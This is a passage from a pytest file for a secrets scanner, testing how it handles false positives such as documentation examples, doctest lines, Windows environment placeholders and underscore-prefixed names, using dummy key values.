    cannot delete the keys, and has nothing to do but suppress the rule.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "t/unit/security/__init__.py",
            "t/integration/test_canvas.py",
            "pkg/mocks/client.go",
            "src/__mocks__/api.ts",
            "internal/golden/output.json",
            "spec/fixtures/key.pem",
            "e2e/support/commands.js",
            "samples/quickstart/config.yaml",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path)

    @pytest.mark.parametrize(
        "path",
        ["celery/app/base.py", "src/main.rs", "cmd/server/main.go", "lib/client.rb"],
    )
    def test_application_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_test_material

        assert not is_test_material(path)


class TestACredentialInDocumentationIsUsuallyAFormat:
    """Celery's SQS page carries a broker URL whose access key is the alphabet in
    order, and two lines below it the same URL written with
    `aws_access_key_id:aws_secret_access_key` as the format. The first was reported
    at HIGH.

    Ceilinged rather than suppressed, and the distinction matters: a real key pasted
    into a README leaks exactly as far as one in a settings file, and plenty have
    been. It stays in the report, below the severity that fails a build, with a
    caveat saying why.
    """

    @pytest.mark.parametrize(
        "path",
        [
            "docs/getting-started/brokers/sqs.rst",
            "README.md",
            "CONTRIBUTING.md",
            "doc/configuration.txt",
            "notebooks/demo.ipynb",
            "config/app.yaml.example",
        ],
    )
    def test_it_is_recognised(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert is_documentation(path)

    @pytest.mark.parametrize("path", ["src/settings.py", "app/config.ts", "main.go"])
    def test_code_is_not(self, path: str) -> None:
        from cordon_scanner.detect.secrets import is_documentation

        assert not is_documentation(path)

    def test_a_key_in_a_readme_is_reported_below_blocking(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "README.md").write_text(
            f"Set your key:\n\n    SECRET_KEY={value}\n", encoding="utf-8"
        )
        from cordon_scanner import Scanner
        from cordon_scanner.core.config import Config
        from cordon_scanner.core.models import Severity

        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        hits = [f for f in result.findings if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"]
        assert hits, "a credential in documentation must still be reported"
        assert all(f.severity <= Severity.MEDIUM for f in hits)
        assert all("documentation" in f.message for f in hits)


class TestADoctestIsDocumentation:
    """Django's template parser documents itself with a doctest line assigning a
    filter expression to a local called `token`, and the assignment rule read the
    filter expression as a credential assigned to it. A transcript is prose that
    happens to be executable, and a value in one illustrates a format by
    construction.
    """

    @pytest.mark.parametrize(
        "line",
        [
            ">>> token = 'variable{0}default:\"Default value\"'",
            "... token = 'variable{0}default:\"Default value\"'",
            "$ export AUTH_TOKEN=" + assemble("aB3kQ9mZ", "2xT7vL4nR8wY"),
            "In [3]: token = 'variable{0}default:\"Default value\"'",
        ],
    )
    def test_a_transcript_line_is_an_example(self, tmp_path, line: str) -> None:
        (tmp_path / "base.py").write_text(
            f'"""\nSample::\n\n    {line.format("|")}\n"""\n', encoding="utf-8"
        )
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_an_ordinary_assignment_still_fires(self, tmp_path) -> None:
        value = assemble("aB3kQ9mZ", "2xT7vL4nR8wY")
        (tmp_path / "settings.py").write_text(f'SECRET_KEY = "{value}"\n', encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestAWindowsEnvironmentReferenceIsNotAValue:
    """Django's documentation extension builds `token = "%HOMEPATH%\\\\" + token[2:]`,
    which the assembled-literal path folded into a value assigned to something
    called `token` and reported at HIGH.

    `%VAR%` says the value arrives from the environment exactly as plainly as `$VAR`
    does, and the POSIX form was already here. Any build script that touches Windows
    paths is full of it.
    """

    @pytest.mark.parametrize(
        "value", [rb"%HOMEPATH%\\", rb"%USERPROFILE%/.config", rb"%APPDATA%\\cordon"]
    )
    def test_it_is_a_placeholder(self, value: bytes) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert PLACEHOLDER.search(value)

    def test_a_real_value_is_not(self) -> None:
        from cordon_scanner.detect.secrets import PLACEHOLDER

        assert not PLACEHOLDER.search(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode())


class TestAnUnderscoredNameIsStillAName:
    """`INTERNAL_RESET_SESSION_TOKEN = "_password_reset_token"` at HIGH. The value is
    a session key NAME, and the identifier alternative in `NOT_A_SECRET` required the
    first character to be a letter -- so a leading underscore, which is how Python
    spells "private", made an obvious identifier unrecognisable.
    """

    @pytest.mark.parametrize(
        "value", [b"_password_reset_token", b"_auth_token_cache", b"_internal_secret_key"]
    )
    def test_it_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value)

    def test_key_material_is_still_key_material(self) -> None:
        assert NOT_A_SECRET.match(assemble("aB3kQ9mZ", "2xT7vL4nR8wY").encode()) is None
